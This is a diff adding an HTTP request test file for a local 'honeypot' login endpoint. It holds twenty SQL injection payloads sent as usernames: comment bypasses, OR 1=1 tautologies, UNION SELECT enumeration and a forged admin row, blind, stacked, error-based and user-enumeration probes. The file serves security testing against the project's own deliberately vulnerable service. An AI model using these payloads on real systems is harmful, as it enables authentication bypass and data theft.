@@ -1,0 +1,218 @@
+### ==============================================
+### 🚨 HONEYPOT - SQL INJECTION TESTS
+### ==============================================
+
+@baseUrl = http://localhost:3000
+@apiUrl = http://localhost:3000/api
+
+### =====================================================
+### SQL INJECTION - COMMENT BYPASS
+### =====================================================
+
+### 1. SQL Injection - Comment Bypass Simple (admin'--)
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin'--",
+  "password": "cualquiercosa"
+}
+
+### 2. SQL Injection - Comment with space (admin'-- )
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin'-- ",
+  "password": "anything"
+}
+
+### 3. SQL Injection - Comment # (admin'#)
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin'#",
+  "password": "test"
+}
+
+### 4. SQL Injection - Comment /* (admin'/**/-- )
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin'/**/--",
+  "password": "whatever"
+}
+
+### =====================================================
+### SQL INJECTION - ALWAYS TRUE CONDITIONS
+### =====================================================
+
+### 5. SQL Injection - OR 1=1 (basic)
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "' OR 1=1--",
+  "password": "x"
+}
+
+### 6. SQL Injection - OR '1'='1' (string based)
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "' OR '1'='1",
+  "password": "anything"
+}
+
+### 7. SQL Injection - OR 'a'='a'
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "' OR 'a'='a'--",
+  "password": "test"
+}
+
+### 8. SQL Injection - admin' OR 1=1--
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin' OR 1=1--",
+  "password": "x"
+}
+
+### =====================================================
+### SQL INJECTION - UNION ATTACKS
+### =====================================================
+
+### 9. SQL Injection - UNION SELECT (enumerar columnas)
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
+  "password": "x"
+}
+
+### 10. SQL Injection - UNION SELECT con admin falso
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "' UNION SELECT 1,'injected_admin','admin@injected.com','hacked123','admin',1,NOW(),NOW(),NULL,0--",
+  "password": "x"
+}
+
+### =====================================================
+### SQL INJECTION - BOOLEAN BLIND
+### =====================================================
+
+### 11. Boolean Blind - Test si admin existe
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin' AND '1'='1",
+  "password": "x"
+}
+
+### 12. Boolean Blind - Test si admin NO existe (false condition)
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin' AND '1'='2",
+  "password": "x"
+}
+
+### =====================================================
+### SQL INJECTION - STACKED QUERIES (si está habilitado)
+### =====================================================
+
+### 13. Stacked Query - Intentar múltiples statements
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin'; SELECT * FROM users--",
+  "password": "x"
+}
+
+### =====================================================
+### SQL INJECTION - ENUMERACIÓN DE USUARIOS
+### =====================================================
+
+### 14. Verificar si 'root' existe
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "root'--",
+  "password": "x"
+}
+
+### 15. Verificar si 'dev_backup' existe
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "dev_backup'--",
+  "password": "x"
+}
+
+### 16. Verificar si 'service_account' existe
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "service_account'--",
+  "password": "x"
+}
+
+### =====================================================
+### SQL INJECTION - ERROR-BASED
+### =====================================================
+
+### 17. Error-Based - Generar error de sintaxis
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin''",
+  "password": "x"
+}
+
+### 18. Error-Based - Comilla sin cerrar
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin'",
+  "password": "x"
+}
+
+### =====================================================
+### TESTS DE MITIGACIÓN (deberían fallar si hay fixes)
+### =====================================================
+
+### 19. Test con escape de comillas (si hay sanitización)
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin\\'--",
+  "password": "x"
+}
+
+### 20. Test con NULL byte (si hay validación)
+POST {{apiUrl}}/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin'%00--",
+  "password": "x"
+}
